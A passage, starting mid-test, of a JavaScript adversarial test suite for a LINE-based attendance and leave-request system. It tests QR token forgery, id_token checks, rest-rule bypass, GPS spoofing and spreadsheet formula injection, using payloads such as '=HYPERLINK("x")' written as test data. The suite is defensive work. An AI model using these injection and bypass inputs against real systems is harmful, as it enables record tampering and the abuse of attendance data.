  assert.ok(m.sb.handleLiffPunch_(Object.assign({ id_token: 'TOK_U1', type: 'in' }, HERE)).ok);
  const r = m.sb.handleLiffPunch_(Object.assign({ id_token: 'TOK_U1', type: 'in' }, HERE));
  assert.strictEqual(r.ok, false); assert.ok(/10 分鐘內不能打上班卡/.test(r.reason), r.reason);
});
ok('QR：改主管列號不改簽章→拒；最多 90 秒；過去的窗→拒；停用主管拿不到；改 QR_STORE 後舊 tag 的 QR 全部失效', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [], managers: [['值班主管', 'MK', 'true', ''], ['停用主管', 'OLDK', 'false', '']] }, props: { QR_STORE: 'gk', QR_SECRET: 'seed-0000-seed-0000' } });
  const sb = m.sb, t = sb.handleMgrQrToken_({ mgr_key: 'MK', store: 'gk' }), win = Math.floor(sb.__now / 30000);
  assert.ok(sb.reqQrVerify_(t.token, sb.__now).ok);
  assert.ok(sb.reqQrVerify_(t.token, (win + 2) * 30000 + 29999).ok);
  assert.strictEqual(sb.reqQrVerify_(t.token, (win + 3) * 30000).ok, false);
  assert.strictEqual(sb.reqQrVerify_(t.token, sb.__now - 30000).ok, false);
  const p = t.token.split('~'); assert.strictEqual(sb.reqQrVerify_([p[0], p[1], '3', p[3]].join('~'), sb.__now).ok, false);
  assert.strictEqual(sb.handleMgrQrToken_({ mgr_key: 'OLDK' }).error, 'unauthorized');
  sb.handleMgrQrToken_({ mgr_key: 'MK', store: 'zz' });
  assert.strictEqual(sb.reqQrVerify_(t.token, sb.__now).ok, false);
});
ok('QR 打卡：座標亂給也用店家座標（距離 0）、另記 qr_punch；休息規則照擋（沒有例外）', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [[T('2026-11-02T11:00:00'), 'E01', 'in'], [T('2026-11-02T23:00:00'), 'E01', 'out']] }, props: { QR_STORE: 'gk', REST_RULE_ON: '1' } });
  const tok = m.sb.handleMgrQrToken_({ mgr_key: 'MK', store: 'gk' }).token;
  const r = m.sb.handleLiffPunch_({ id_token: 'TOK_U1', type: 'in', qr: tok, lat: 0, lng: 0, accuracy: 99999 });
  assert.strictEqual(r.status, 'rejected_rest');
  m.setNow('2026-11-03T10:00:00');
  const r2 = m.sb.handleLiffPunch_({ id_token: 'TOK_U1', type: 'in', qr: m.sb.handleMgrQrToken_({ mgr_key: 'MK', store: 'gk' }).token, lat: 0, lng: 0, accuracy: 99999 });
  assert.ok(r2.ok && r2.via_qr); assert.strictEqual(m.self.sh.qr_punch.values[1][1], 'E01');
});
ok('id_token：aud 不是本 channel→拒；快取 ≤ exp−30 秒；解綁後同一張 token 立刻 not_bound', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] },
    lineUsers: { TOK_U1: { sub: 'U1' }, TOK_BAD: { sub: 'U1', aud: '999' }, TOK_EXP: { sub: 'U1', exp: Math.floor(T('2026-11-03T09:00:00') / 1000) + 40 } } });
  const sb = m.sb;
  assert.strictEqual(sb.verifyLineIdToken_('TOK_BAD'), null);
  sb.verifyLineIdToken_('TOK_EXP'); const n = sb.__fetches.length;
  sb.__now += 9000; sb.verifyLineIdToken_('TOK_EXP'); assert.strictEqual(sb.__fetches.length, n);
  sb.__now += 2000; sb.verifyLineIdToken_('TOK_EXP'); assert.strictEqual(sb.__fetches.length, n + 1);
  assert.strictEqual(sb.verifyLineIdToken_('TOK_U1'), 'U1');
  m.self.sh.roster.values[1][RH.indexOf('line_user_id')] = '';
  assert.strictEqual(sb.handleLiffPunch_(Object.assign({ id_token: 'TOK_U1', type: 'in' }, HERE)).error, 'not_bound');
});
ok('休息規則：先打一張下班卡再打上班繞不過；別店全形空白同名也算；16 小時整配成一段、17 小時不成段', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), props: { REST_RULE_ON: '1' }, self: { roster: [ME], events: [[T('2026-11-02T11:00:00'), 'E01', 'in'], [T('2026-11-02T23:00:00'), 'E01', 'out']] } });
  assert.strictEqual(punch(m.sb, 'in').status, 'rejected_rest');
  assert.strictEqual(punch(m.sb, 'out').status, 'ok');
  m.setNow('2026-11-03T09:11:00');
  assert.strictEqual(punch(m.sb, 'in').status, 'rejected_rest');
  const js = book('JS', { roster: [RH, rosterRow({ emp_id: 'M9', name: '測試　一', key: 'x', active: 'TRUE' })], events: [EH, evRow([T('2026-11-02T15:00:00'), 'M9', 'in']), evRow([T('2026-11-02T23:00:00'), 'M9', 'out'])] });
  const m2 = make({ now: T('2026-11-03T09:00:00'), props: { REST_RULE_ON: '1' }, self: { roster: [ME], events: [] }, peers: { JS: js } });
  assert.strictEqual(m2.sb.restCheckIn_(m2.self, { emp_id: 'E01', name: '測試一' }).code, 'gap');
  const m3 = make({ now: T('2026-11-03T09:00:00'), props: { REST_RULE_ON: '1' }, self: { roster: [ME], events: [[T('2026-11-02T08:00:00'), 'E01', 'in'], [T('2026-11-03T00:00:00'), 'E01', 'out']] } });
  assert.strictEqual(m3.sb.restCheckIn_(m3.self, ME).code, 'gap');
  const m4 = make({ now: T('2026-11-03T09:00:00'), props: { REST_RULE_ON: '1' }, self: { roster: [ME], events: [[T('2026-11-02T08:00:00'), 'E01', 'in'], [T('2026-11-03T01:00:00'), 'E01', 'out']] } });
  assert.strictEqual(m4.sb.restCheckIn_(m4.self, ME), null);   // 已知：超過 16 小時的班不成段、算不出間隔（規格取捨）
});
ok('申請表公式注入：reason／退回理由／acting_name 以 = + - @ 或 NBSP／tab 開頭都換成全形', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [], managers: [['值班主管', 'MK', 'true', ''], ['營運系統', 'SVC', 'true', 'TRUE']] } });
  const sb = m.sb, rows = m.self.sh.requests ? null : null;
  const a = sub(sb, { kind: 'leave', date: '2026-11-05', leave_type: '事假', hours: 2, reason: '=1+1' });
  sub(sb, { kind: 'leave', date: '2026-11-06', leave_type: '事假', hours: 2, reason: ' =1+1' });
  sub(sb, { kind: 'leave', date: '2026-11-07', leave_type: '事假', hours: 2, reason: '\t@x' });
  sb.handleMgrReqDecide_({ mgr_key: 'SVC', acting_name: '=HYPERLINK("x")', id: a.request.id, decision: 'reject', reason: '+not ok' });
  const v = m.self.sh.requests.values;
  assert.strictEqual(v[1][11], '＝1+1'); assert.strictEqual(v[2][11], '＝1+1'); assert.strictEqual(v[3][11], '＠x');
  assert.strictEqual(v[1][15], '＝HYPERLINK("x")'); assert.strictEqual(v[1][16], '＋not ok');
});
ok('申請：別人不能取消／補附；取消後批次核准略過；作廢後不能再核；病假沒證明不能核（單筆與批次）', () => {
  const U2 = { emp_id: 'E02', name: '測試二', key: 'K2', device_id: 'D2', active: 'TRUE', line_user_id: 'U2' };
  const m = make({ now: T('2026-11-03T16:00:00'), self: { roster: [ME, U2], events: [] } });
  const sb = m.sb;
  const a = sub(sb, { kind: 'leave', date: '2026-11-05', leave_type: '病假', hours: 4 });
  assert.strictEqual(sb.handleReqCancel_({ id_token: 'TOK_U2', id: a.request.id }).error, 'not_found');
  assert.strictEqual(sb.handleReqAttach_({ id_token: 'TOK_U2', id: a.request.id, attach_id: 'abcdefghijklmnop' }).error, 'not_found');
  assert.strictEqual(sb.handleMgrReqDecide_({ mgr_key: 'MK', id: a.request.id, decision: 'approve' }).error, 'need_proof');
  assert.strictEqual(sb.handleMgrReqDecideBatch_({ mgr_key: 'MK', ids: [a.request.id], decision: 'approve' }).done.length, 0);
  const b = sub(sb, { kind: 'leave', date: '2026-11-06', leave_type: '事假', hours: 4 });
  sb.handleReqCancel_({ id_token: 'TOK_U1', id: b.request.id });
  assert.strictEqual(sb.handleMgrReqDecideBatch_({ mgr_key: 'MK', ids: [b.request.id], decision: 'approve' }).skipped[0].reason, '同仁已經取消這筆申請');
  const c = sub(sb, { kind: 'leave', date: '2026-11-07', leave_type: '事假', hours: 4 });
  sb.handleMgrReqDecide_({ mgr_key: 'MK', id: c.request.id, decision: 'approve' });
  assert.ok(sb.handleMgrReqVoid_({ mgr_key: 'MK', id: c.request.id, reason: '舊單' }).ok);
  assert.strictEqual(sb.handleMgrReqDecide_({ mgr_key: 'MK', id: c.request.id, decision: 'approve' }).error, 'not_pending');
});
ok('申請：日期驗真（閏日 2028-02-29 收、2026-02-29／11-31／13 月拒）；忘打卡 7 天內含第 7 天；加班 12 小時整收、91 天後拒；reason 截 100 字', () => {
  const m = make({ now: T('2026-11-10T16:00:00'), self: { roster: [ME], events: [[T('2026-11-03T09:00:00'), 'E01', 'in'], [T('2026-11-02T09:00:00'), 'E01', 'in']] } });
  const sb = m.sb;
  assert.deepStrictEqual(['2028-02-29', '2026-02-29', '2026-11-31', '2026-13-01'].map(sb.reqIsDate_), [true, false, false, false]);
  assert.ok(sub(sb, { kind: 'miss', date: '2026-11-03', miss_type: 'out', end: '18:00', reason: '忘記按' }).ok);
  assert.strictEqual(sub(sb, { kind: 'miss', date: '2026-11-02', miss_type: 'out', end: '18:00', reason: '忘記按' }).error, 'too_old');
  assert.strictEqual(sub(sb, { kind: 'ot', date: '2026-11-14', start: '08:00', end: '20:00', reason: 'x' }).request.hours, 12);
  assert.strictEqual(sub(sb, { kind: 'ot', date: '2027-02-09', start: '08:00', end: '10:00', reason: 'x' }).error, 'bad_date');
  assert.strictEqual(sub(sb, { kind: 'leave', date: '2026-11-20', leave_type: '事假', hours: 4, reason: 'x'.repeat(5000) + '\u0000' }).request.reason.length, 100);
});
ok('名冊兩列綁同一個 LINE（主管復職舊列）：打卡與綁定都 fail-closed', () => {
  const DUP = { emp_id: 'E07', name: '測試一', key: 'K7', device_id: '', active: 'TRUE', line_user_id: 'U1' };
  const m = make({ now: T('2026-11-10T09:00:00'), self: { roster: [ME, DUP], events: [] } });
  assert.strictEqual(m.sb.handleLiffStatus_({ id_token: 'TOK_U1' }).error, 'line_identity_conflict');
  assert.strictEqual(m.sb.handleLiffBind_({ id_token: 'TOK_U3', key: 'K7' }).error, 'already_bound_other_user');
});
ok('忘打卡提醒：7 天整前的上班卡仍提醒；下班時 16 小時整內有上班卡不提醒', () => {
  const m = make({ now: T('2026-11-10T09:00:00'), self: { roster: [ME], events: [] } });
  const ev = (ts, type) => ({ ts: iso(T(ts)), emp_id: 'E01', type, status: 'ok' });
  assert.strictEqual(m.sb.liffMissedDetail_([ev('2026-11-03T09:00:00', 'in')], 'E01', 'in', iso(T('2026-11-10T09:00:00'))).miss_type, 'out');
  assert.strictEqual(m.sb.liffMissedDetail_([ev('2026-11-09T17:00:00', 'in')], 'E01', 'out', iso(T('2026-11-10T09:00:00'))).text, '');
});
ok('webhook：destination 不是本帳號不處理；群組訊息不回；一次 50 個事件只處理 10 個', () => {
  const m = make({ now: T('2026-11-03T09:00:00'), self: { roster: [ME], events: [] }, hub: true });
  const sb = m.sb, replies = [];
  sb.lineHubReply_ = (tok, msgs) => replies.push(msgs); sb.lineHubLoading_ = () => {}; sb.LINE_HUB_BOT_USER_ID = 'BOT';
  sb.lineHubAttendanceCard_ = () => ({ stub: 'att' });
  const ev = (extra) => Object.assign({ type: 'message', message: { type: 'text', text: '出勤紀錄' }, source: { type: 'user', userId: 'U1' }, replyToken: 'R' }, extra || {});
  assert.strictEqual(sb.handleLineWebhook_({ destination: 'OTHER', events: [ev()] }).ignored, 'destination');
  sb.handleLineWebhook_({ destination: 'BOT', events: [ev({ source: { type: 'group', groupId: 'G', userId: 'U1' } })] });
  assert.strictEqual(replies.length, 0);
  sb.handleLineWebhook_({ destination: 'BOT', events: Array.from({ length: 50 }, () => ev()) });
  assert.strictEqual(replies.length, 10);
});
ok('handleClock 怪值：lat/lng 非數字→超出範圍；accuracy 1e9 只折抵 100（約 100 公尺外剛好過＝已知取捨）', () => {
  const m = make({ now: T('2026-11-03T09:05:00'), self: { roster: [ME], events: [] } });
  assert.strictEqual(m.sb.handleClock({ key: 'K1', type: 'in', lat: 'abc', lng: 'x', accuracy: 5, device_id: 'D1' }).status, 'rejected_out_of_range');
  m.setNow('2026-11-03T09:20:00');
  const r = m.sb.handleClock({ key: 'K1', type: 'in', lat: 24.7809, lng: 121.01, accuracy: 1e9, device_id: 'D1' });
  assert.strictEqual(r.status, 'ok'); assert.ok(r.distance_m > 95 && r.distance_m < 105, r.distance_m);
});

console.log(`\n通過 ${nOk} 項；已確認問題 ${nKnownOpen} 項待修（KNOWN）${nKnownFixed ? '、' + nKnownFixed + ' 項已修好' : ''}` + (failed ? `；守門失敗 ${failed} 項` : ''));
if (failed || (process.env.ADV_STRICT === '1' && nKnownOpen)) process.exit(1);
